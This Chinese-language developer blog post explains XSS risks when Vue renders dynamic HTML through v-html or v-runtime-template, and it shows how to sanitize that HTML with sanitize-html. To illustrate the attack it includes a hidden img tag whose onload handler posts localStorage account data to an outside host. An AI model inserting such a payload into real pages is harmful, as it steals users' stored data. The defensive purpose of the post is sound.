---
title: Vue Dynamic HTML Prevent XSS
date: 2022-06-26 23:39:36
tags:
  - Vue
  - v-html
  - v-sanitize
  - v-runtime-template
---

在開發系統中 有可能會需要使用到 CMS 系統或是動態抓取 CDN 的頁面 取得

使用者動態設定的樣板或是 Banner 這裡一般人可能不會特別想到就是 XSS Attack

我曾經遇過 真的有被駭客將靜態的 html 檔案裏面故意塞惡意程式碼，導致使用者看到錯誤畫面的狀況

(ex: 這些 html 可能被駭客塞一些 js or redirect 導到錯誤網站 讓使用者看到一些錯誤資訊)

可以參考這篇
[Vue XSS Attack Guide](https://www.stackhawk.com/blog/vue-xss-guide-examples-and-prevention/#injecting-the-malicious-script)

舉例來說我們可以透過隱藏的圖片發送 request 給 駭客的 Server 並且偷取到對應的 Cookie or Session ....

```html
<img
  src="xxxx"
  style="display:none"
  onload="fetch('https://test.api/', {method: 'POST', body: localStorage.getItem('account')})"
/>
```

回到主題來說
這裡列出兩種 vue 的 componet 可以動態 compile html ，這裡列出來用途以及差異
| Plugnin | Support | different | |
|--------------------|--------|--- --------|---|
| v-html | 只支援純粹 HTML 無法支援 vue custom component | 無法防止 XSS attack |
| v-runtime-template | 支援 vue custom component & variabe (需事先定義好) | 無法防止 XSS attack |

以下是範例
[DEMO](https://codesandbox.io/s/dynamic-template-yvfx0n)

我們可以看到我們在圖片 loading 的過程中插入 alert 如果沒有做任何阻擋 兩種方法都會跳 Alert

```html
<img
  src="https://jnx.me/img/profile.jpg"
  style="display:none"
  onload="alert('xss');"
/>
```

接下來我們介紹今天的主角 Sanitize html

[sanitize html](https://github.com/apostrophecms/sanitize-html)
在 Vue 3 裡面可以用[vue-3-sanitize](https://github.com/vannsl/vue-3-sanitize)

套件

我們這裡可以透過此套件做比較主要的三件事情

1. 限制動態 HTML 的 TAG

Default options

```javascript
allowedTags: [
  "address", "article", "aside", "footer", "header", "h1", "h2", "h3", "h4",
  "h5", "h6", "hgroup", "main", "nav", "section", "blockquote", "dd", "div",
  "dl", "dt", "figcaption", "figure", "hr", "li", "main", "ol", "p", "pre",
  "ul", "a", "abbr", "b", "bdi", "bdo", "br", "cite", "code", "data", "dfn",
  "em", "i", "kbd", "mark", "q", "rb", "rp", "rt", "rtc", "ruby", "s", "samp",
  "small", "span", "strong", "sub", "sup", "time", "u", "var", "wbr", "caption",
  "col", "colgroup", "table", "tbody", "td", "tfoot", "th", "thead", "tr"
],
disallowedTagsMode: 'discard',
allowedAttributes: {
  a: [ 'href', 'name', 'target' ],
  // We don't currently allow img itself by default, but
  // these attributes would make sense if we did.
  img: [ 'src', 'srcset', 'alt', 'title', 'width', 'height', 'loading' ]
},
// Lots of these won't come up by default because we don't allow them
selfClosing: [ 'img', 'br', 'hr', 'area', 'base', 'basefont', 'input', 'link', 'meta' ],
// URL schemes we permit
allowedSchemes: [ 'http', 'https', 'ftp', 'mailto', 'tel' ],
allowedSchemesByTag: {},
allowedSchemesAppliedToAttributes: [ 'href', 'src', 'cite' ],
allowProtocolRelative: true,
enforceHtmlBoundary: false
```

2. 限制 CSS & Script & iframe 語法

```javascript
const clean = sanitizeHtml(
  '<script src="https://www.safe.authorized.com/lib.js"></script>',
  {
    allowedTags: ['script'],
    allowedAttributes: {
      script: ['src'],
    },
    allowedScriptDomains: ['authorized.com'],
  }
);
```

```css
onst clean = sanitizeHtml(dirty, {
        allowedTags: ['p'],
        allowedAttributes: {
          'p': ["style"],
        },
        allowedStyles: {
          '*': {
            // Match HEX and RGB
            'color': [/^#(0x)?[0-9a-f]+$/i, /^rgb\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*\)$/],
            'text-align': [/^left$/, /^right$/, /^center$/],
            // Match any number with px, em, or %
            'font-size': [/^\d+(?:px|em|%)$/]
          },
          'p': {
            'font-size': [/^\d+rem$/]
          }
        }
      });
```
